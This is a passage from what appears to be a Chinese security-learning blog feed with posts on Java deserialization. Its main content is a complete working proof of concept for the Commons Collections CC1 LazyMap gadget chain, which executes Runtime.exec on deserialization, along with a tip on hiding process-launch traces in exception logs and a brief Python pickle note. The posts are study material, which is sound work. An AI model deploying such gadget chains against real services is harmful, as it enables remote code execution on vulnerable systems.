class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">assert</span> var5.length == <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;annotationType&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">            <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(<span class="built_in">this</span>.type, var4);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                    var6 = <span class="built_in">this</span>.cloneArray(var6);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> var6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如何调用这里的invoke()呢，注意到</p><ol><li><strong>实现了什么和继承了什么和类中实际写的东西一样重要</strong>，可以理解为<strong>定性分析</strong></li><li>这里其实就是动态代理需要传入handler，会在调用任何方法的时候调用这个handler的invoke()</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Proxy.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span><br><span class="line"><span class="params">                                      Class&lt;?&gt;[] interfaces,</span></span><br><span class="line"><span class="params">                                      InvocationHandler h)</span></span><br><span class="line">    <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>知道动态代理后又要怎么进行利用呢，见下面的poc章节</p></li></ol><h2 id="CC1-LazyMap-poc"><a href="#CC1-LazyMap-poc" class="headerlink" title="CC1_LazyMap poc"></a>CC1_LazyMap poc</h2><blockquote><p>理解了CC1_TransformedMap链后再来LazyMap就很轻松了<br>基于p牛进行学习而来，也算是都是自己编写的了<br>利用版本也是一样的，LazyMap仍然无法解决CommonCollections1这条利用链在高版本Java（8u71以后）中的使用问题</p></blockquote><ol><li><p>上面复习了点动态代理概念(回去看看应用就懂了)，现在来先自己想一下要求</p><ol><li>要求一：将AnnotationinvocationHandler的设置为一个对象的动态代理，然后调用该对象的任意方法(注意避开几个被写明的)调用到invoke函数</li><li>要求二：将LazyMap设置为AnnotationinvocationHandler的memberValues，通过get不存在的key来触发恶意transform链子(上一条CC1是用到TransformedMap)</li><li>要求三：设置handler是AnnotationinvocationHandler的对象(被动态代理)需要调用某一个方法，想不到了<ol><li><em><strong>p牛思路</strong></em>: 通过再次进行包裹这个对象为AnnotationinvocationHandler，然后反序列化readObject()会调用到这个Map的方法比如<code>Iterator var4 = this.memberValues.entrySet().iterator();</code>，此时会直接跳到动态代理，再到LazyMap的get中 –&gt; <strong>嫉妒甜菜</strong></li></ol></li></ol></li><li><p>虽然还会有报错，<strong>在transformers最后使用ConstantTransformer可以做到隐藏异常日志中的一些信息(隐蔽了启动进程的日志特征)</strong></p><ol><li>看调用栈和自己预想的是一样的，very good</li></ol> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">java.lang.ClassCastException: java.lang.String cannot be cast to java.util.Set</span><br><span class="line">at com.sun.proxy.<span class="variable">$Proxy0</span>.entrySet(Unknown Source)</span><br><span class="line">at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:346)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:601)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1004)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1891)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1796)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1348)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)</span><br><span class="line">at CC1.CC1_p_LazyMap.<span class="built_in">test</span>(CC1_p_LazyMap.java:78)</span><br><span class="line">at CC1.CC1_p_LazyMap.main(CC1_p_LazyMap.java:23)</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ysoserial的调用链，这个自己写的思路也是这样</span></span><br><span class="line"><span class="comment"> * Gadget chain:</span></span><br><span class="line"><span class="comment"> *    ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment"> *        AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment"> *            Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment"> *                AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment"> *                    LazyMap.get()</span></span><br><span class="line"><span class="comment"> *                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment"> *                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment"> *                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment"> *                                Method.invoke()</span></span><br><span class="line"><span class="comment"> *                                    Class.getMethod()</span></span><br><span class="line"><span class="comment"> *                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment"> *                                Method.invoke()</span></span><br><span class="line"><span class="comment"> *                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment"> *                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment"> *                                Method.invoke()</span></span><br><span class="line"><span class="comment"> *                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_p_LazyMap</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 1. 构造payload * * * * * */</span></span><br><span class="line">            <span class="comment">// 依照思路是要给lazymap的转换器的</span></span><br><span class="line">            Transformer[] transformers = &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">// 到这里才调用了getRuntime()获取了对应的对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">                    ,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 构造lazymap * * * * * */</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 反射创建我的handler * * * * * */</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">lazyHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class,lazyMap);  <span class="comment">// 这里的Retention是没有作用的，用来占位</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 4. 在readObject时调用invoke * * * * * */</span></span><br><span class="line">            <span class="comment">// 通过动态代理来调用invoke</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">proxyedLazyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),lazyMap.getClass().getInterfaces(),lazyHandler);</span><br><span class="line">            <span class="comment">// AnnotationInvocationHandler就可，有Iterator var4 = this.memberValues.entrySet().iterator();</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Retention.class, proxyedLazyMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 5. 模拟序列化与反序列化 * * * * * */</span></span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            ois.readObject();    <span class="comment">// 这里如果注释掉不会弹出来计算器，但是要是不注释就会弹，说明正确的</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ysoserial的其他操作"><a href="#ysoserial的其他操作" class="headerlink" title="ysoserial的其他操作"></a>ysoserial的其他操作</h2><ol><li><p>调试上述POC的时候，会发现弹出了两个计算器，或者没有执行到readObject的时候就弹出了计算器(虽然我不会)</p></li><li><p><strong>REASON:</strong> 在使用Proxy代理了map对象后，我们在任何地方执行map的方法就会触发Payload弹出计算器，所以，在本地调试代码的时候，因为调试器会在下面调用一些toString之类的方法，导致不经意间触发了命令</p></li><li><p>ysoserial的处理: 在POC的最后才将执行命令的Transformer数组设置到transformerChain中，原因是避免本地生成序列化流的程序执行到命令（在调试程序的时候可能会触发一次Proxy#invoke ）</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>java安全漫谈</li><li><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DCommonsCollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0(%E4%B8%AD).md">依旧是信工所大牛</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python反序列化</title>
      <link href="/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="二话不说先宏观理解"><a href="#二话不说先宏观理解" class="headerlink" title="二话不说先宏观理解"></a>二话不说先宏观理解</h2><blockquote><p>FROM java安全漫谈反序列化(1):<br>Python的反序列化过程实际上是在执行一个基于栈的虚拟机。我们可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序(rce)<br>所以，Python的反序列化可以立即导致任意函数、命令执行漏洞，与需要gadget的PHP和Java相比更加危险</p></blockquote><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">Code-Breaking中的两个Python沙箱</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(3)_CC1_TransformedMap</title>
      <link href="/2024/11/16/Java%E5%AE%89%E5%85%A85(3)_CC1_TransformedMap/"/>
      <url>/2024/11/16/Java%E5%AE%89%E5%85%A85(3)_CC1_TransformedMap/</url>
      
        <content type="html"><![CDATA[<h2 id="java反序列化宏观思维"><a href="#java反序列化宏观思维" class="headerlink" title="*java反序列化宏观思维"></a>*java反序列化宏观思维</h2><blockquote><p>开启cc链前，有必要来整理一下一些比较宏观的思维而不是技术细节</p></blockquote><ol><li><em><strong>本源于传输对象</strong></em>：Jackson和Fastjson这类序列化库，在JSON（XML）的基础上进行改造，通过特定的语法来传递对象；亦或者如RMI，直接使用Java等语言内置的序列化方法，将一个对象转换成一串二进制数据进行传输</li><li><em><strong>在与php比较中认识java</strong></em><ol><li>Java的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象</li><li>Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者在<strong>序列化流中插入一些自定义数据</strong>，进而在反序列化的时候能够使用 readObject 进行读取</li><li><strong>readObject()和__wakeup()的不同:</strong> readObject 倾向于解决“反序列化时如何还原一个完整对象”这个问题，而PHP的 __wakeup 更倾向于解决“反序列化后如何初始化这个对象”的问题<ol><li>大部分PHP反序列化漏洞，都并不是由反序列化导致的，只是通过反序列化可以控制对象的属性</li><li>二者的相同之处都是<strong>需要一个Gadget Chain</strong></li></ol></li></ol></li><li><em><strong>什么是时候可以利用</strong></em><ol><li>lib&#x2F;jar包中的类<ol><li>被反序列化的类一般都是 lib&#x2F;jar 包中的类。正常情况下，普通系统的开发在正常情况下很少会重写 readObject() 且存在有效的利用链（普通的开发都是功能型开发，很少用到反序列化）</li><li>由于 Json 的普及使得极少情况下才需要手写序列化的类（结果Jackson和fastjson产生了大量的反序列化漏洞）</li><li>目前曝出来的大部分反序列化利用的都是 lib&#x2F;jar 包中的类，这些类为了通用性就会写出一些特殊的 readObject() 方法，这也导致一些花式攻击手法的产生</li></ol></li><li><strong>通过调用关系形成链式关系，要看透层的关系</strong><ol><li>URLDNS</li><li>接下来的CC1都是这样</li></ol></li></ol></li></ol><h2 id="CC1链前置"><a href="#CC1链前置" class="headerlink" title="CC1链前置"></a>CC1链前置</h2><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="*搭建环境"></a>*搭建环境</h3><ol><li><p>JDK版本应该为8u71之前</p></li><li><p>使用maven搭建，commons-collections3.1</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></li><li><p>换源使用新建setting.xml，加入<a href="https://developer.aliyun.com/mirror/?serviceType=&tag=&keyword=maven">阿里源</a></p></li><li><p>随后下载common-collections3.1的源码就ok，似乎本来是class文件来着</p></li></ol><h3 id="什么是Commons-Collections"><a href="#什么是Commons-Collections" class="headerlink" title="什么是Commons Collections"></a>什么是Commons Collections</h3><ol><li><p>是一个集合组件，扩展了Java标准Collections API，对常用的集合操作进行了很好的封装、抽象和补充</p><ol><li>作为容器类的补充，我们可以找到Bag、Buffer、BidiMap、OrderedMap等等</li><li>作为操作类的补充，我们可以找到CollectionUtils、IteratorUtils、ListUtils、SetUtils等等</li><li>作为辅助类的补充，我们可以找到MapIterator、Closure、Predicate、Transformer等等；</li></ol></li><li><p>12个包结构</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.collections – CommonsCollections自定义的一组公用的接口和工具类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.bag – 实现Bag接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.bidimap – 实现BidiMap系列接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.buffer – 实现Buffer接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.collection –实现java.util.Collection接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.comparators– 实现java.util.Comparator接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors –Commons Collections自定义的一组功能类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.iterators – 实现java.util.Iterator接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.keyvalue – 实现集合和键/值映射相关的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.list – 实现java.util.List接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.map – 实现Map系列接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.set – 实现Set系列接口的一组类</span><br></pre></td></tr></table></figure></li></ol><h3 id="Transformer是什么"><a href="#Transformer是什么" class="headerlink" title="Transformer是什么"></a>Transformer是什么</h3><h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><blockquote><p>attention is all you need!(大雾，不过确实需要惊人的注意力来找链</p></blockquote><ol><li><p>Transformer 是 Apache Commons Collections 库中的一个重要接口，用于表示一个可以将输入对象转换为另一个对象的转换器</p></li><li><p>个人理解</p><ol><li>可以理解为对对象的装饰器，对对象调用给定转换器的transform方法，对对象本身进行操作</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input object (leaving it unchanged) into some output object.</span></span><br><span class="line"><span class="comment">     * 这里的转换可能include method invokation, returning a constant, cloning and returning the string value</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the object to be transformed, should be left unchanged</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> a transformed object</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ClassCastException (runtime) if the input is the wrong class</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException (runtime) if the input is invalid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> FunctorException (runtime) if the transform cannot be completed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><ol><li><p>根据注释，用于装饰一个Map对象，转换它添加的对象，通过<code>decorate()</code>和构造函数可以创建一个TransformedMap对象，进行修饰的修改作用在新的TransformedMap对象身上，这里的TransformedMap是一个装饰器，<strong>会影响到传入的map对象</strong></p><ol><li>支持<code>readObject()</code>和<code>writeObject()</code>两种方法对map进行操作</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 